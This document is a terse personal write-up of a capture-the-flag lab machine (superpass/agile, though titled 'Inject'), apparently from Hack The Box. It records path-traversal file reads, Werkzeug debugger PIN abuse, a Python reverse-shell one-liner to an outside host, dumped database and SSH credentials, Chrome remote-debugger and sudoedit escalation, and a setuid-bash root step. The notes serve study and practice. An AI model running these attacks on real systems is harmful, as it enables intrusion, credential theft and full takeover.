# Inject

## IP = 10.10.11.203

### Initial
```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-21 09:35 EDT
Nmap scan report for superpass.htb (10.10.11.203)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)
|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SuperPassword \xF0\x9F\xA6\xB8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Default credential on /login: `admin:admin`

Flask
Python3.10

### LFI: http://superpass.htb/download?fn=../../../../../../../../../../etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
corum:x:1000:1000:corum:/home/corum:/bin/bash
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false
runner:x:1001:1001::/app/app-testing/:/bin/sh
edwards:x:1002:1002::/home/edwards:/bin/bash
dev_admin:x:1003:1003::/home/dev_admin:/bin/bash
_laurel:x:999:999::/var/log/laurel:/bin/false
```

### Strange SQL error
```
sqlalchemy.exc.OperationalError: (pymysql.err.OperationalError) (2013, 'Lost connection to MySQL server during query')
[SQL: SELECT users.id AS users_id, users.username AS users_username, users.hashed_password AS users_hashed_password 
FROM users 
WHERE users.id = %(id_1)s 
 LIMIT %(param_1)s]
[parameters: {'id_1': '15', 'param_1': 1}]
(Background on this error at: https://sqlalche.me/e/14/e3q8)
```

### Werkzeug PIN code reconstruction	
https://hacktricks.boitatech.com.br/pentesting/pentesting-web/werkzeug

```sh
┌──(venv)─(kali㉿kali)-[~/flask_try]
└─$ python3 hello.py
 * Serving Flask app 'hello'
 * Debug mode: on
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
 * Restarting with stat
 * Debugger is active!
['kali', 'flask.app', 'wsgi_app', '/home/kali/flask_try/venv/lib/python3.11/site-packages/flask/app.py']
 * Debugger PIN: 881-633-235
 * Debugger is active!
['kali', 'flask.app', 'Flask', '/home/kali/flask_try/venv/lib/python3.11/site-packages/flask/app.py']
```

1. Final values is `werkzeug/`
2. Simply run `import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")` in console

### Interesting
/app/config_prod.json:
```
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
```
Inside the box:
```
select * from passwords
    -> ;
;
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
| id | created_date        | last_updated_data   | url            | username | password             | user_id |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
|  3 | 2022-12-02 21:21:32 | 2022-12-02 21:21:32 | hackthebox.com | 0xdf     | 762b430d32eea2f12970 |       1 |
|  4 | 2022-12-02 21:22:55 | 2022-12-02 21:22:55 | mgoblog.com    | 0xdf     | 5b133f7a6a1c180646cb |       1 |
|  6 | 2022-12-02 21:24:44 | 2022-12-02 21:24:44 | mgoblog        | corum    | 47ed1e73c955de230a1d |       2 |
|  7 | 2022-12-02 21:25:15 | 2022-12-02 21:25:15 | ticketmaster   | corum    | 9799588839ed0f98c211 |       2 |
|  8 | 2022-12-02 21:25:27 | 2022-12-02 21:25:27 | agile          | corum    | 5db7caa1d13cc37c9fc2 |       2 |
+----+---------------------+---------------------+----------------+----------+----------------------+---------+
5 rows in set (0.00 sec)

mysql>
```

### www-data -> corum: ssh `corum:5db7caa1d13cc37c9fc2`

### user.txt

### Debugging port on Google Chrome
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/
- Homepage with edwards password

### corum -> edwards: ssh `edwards:d07867c6267dcb5df0af`

### sudo -l
```
edwards@agile:/tmp$ sudo -l                                                                                                                                                                                                                
Matching Defaults entries for edwards on agile:                                                                                                                                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty                                                                                                             
                                                                                                                                                                                                                                           
User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json 
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

### sudo -u dev_admin sudoedit /app/config_test.json
```
{
    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
}
```

### sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
```
edwards:1d7ffjwrx#$d6qn!9nndqgde4
```

### Sudoedit exploit
https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/


### With pspy we notice the `activate` binary being called by root
1. Add `chmod u+s /bin/bash` to `activate`
2. Wait execution
3. `/bin/bash -p`